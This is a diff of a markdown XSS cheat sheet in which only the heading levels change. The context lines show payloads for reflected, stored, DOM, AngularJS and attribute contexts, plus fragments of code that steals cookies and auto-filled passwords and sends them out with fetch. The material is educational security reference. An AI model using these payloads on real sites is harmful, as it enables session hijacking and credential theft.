@@ -11,7 +11,7 @@ There are three main types of XSS attacks. These are:
 * **DOM-based XSS**: where the vulnerability exists in client-side code rather than server-side code.
 
 
-# Reflected XSS
+## Reflected XSS
 
 Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 
 
@@ -19,7 +19,7 @@ Reflected XSS is the simplest variety of cross-site scripting. It arises when an
 https://example.com/status?message=<script>alert(1)</script>
 ```
 
-# Stored XSS
+## Stored XSS
 
 Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 
 
@@ -31,7 +31,7 @@ Content-Length: 100
 postId=3&comment=<script>alert(1)</script>&name=Carlos+Montoya&email=carlos%40normal-user.net
 ```
 
-# DOM-based XSS
+## DOM-based XSS
 
 DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.
 
@@ -49,7 +49,7 @@ element.onevent
 
 > **Note**: Use the browser debugger to see the values of the variables.
 
-## DOM XSS in Jquery
+### DOM XSS in Jquery
 
 If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS.
 
@@ -106,7 +106,7 @@ jQuery.parseHTML()
 $.parseHTML()
 ```
 
-## DOM XSS in AngularJS
+### DOM XSS in AngularJS
 
 If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the `ng-app` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.
 
@@ -116,14 +116,14 @@ Example of payload:
 {{$on.constructor('alert(1)')()}}
 ```
 
-# XSS contexts
+## XSS contexts
 
 Visit the following link to see all posible tags and attributes.
 
 * [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 
-## XSS between HTML tags
+### XSS between HTML tags
 
 Typicall payloads are:
 
@@ -151,7 +151,7 @@ document.location = "https://example.com/?search=%3Cbenjugat+id%3Dx+onfocus%3Dal
 </script>
 ```
 
-## XSS in HTML attributes
+### XSS in HTML attributes
 
 * **Terminating the tag**:
 
@@ -199,7 +199,7 @@ You can specify a different key combination using a different key in the access 
 <input type="hidden" accesskey="X" onclick="alert(1)">
 ```
 
-## XSS into JavaScript
+### XSS into JavaScript
 
 When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit. 
 
@@ -238,7 +238,7 @@ JavaScript template literals are string literals that allow embedded JavaScript 
 ${alert(document.domain)}
 ```
 
-# XSS to steal cookies
+## XSS to steal cookies
 
 Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.
 
@@ -256,7 +256,7 @@ body:document.cookie
 </script>
 ```
 
-# XSS to capture passwords
+## XSS to capture passwords
 
 These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 
 
@@ -269,7 +269,7 @@ body:username.value+':'+this.value
 });">
 ```
 
-# XSS to bypass CSRF protections
+## XSS to bypass CSRF protections
 
 Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability on one of these sites, you can exploit it to steal a CSRF token. With the token, you can change the victim's email address to one that you control. 
 
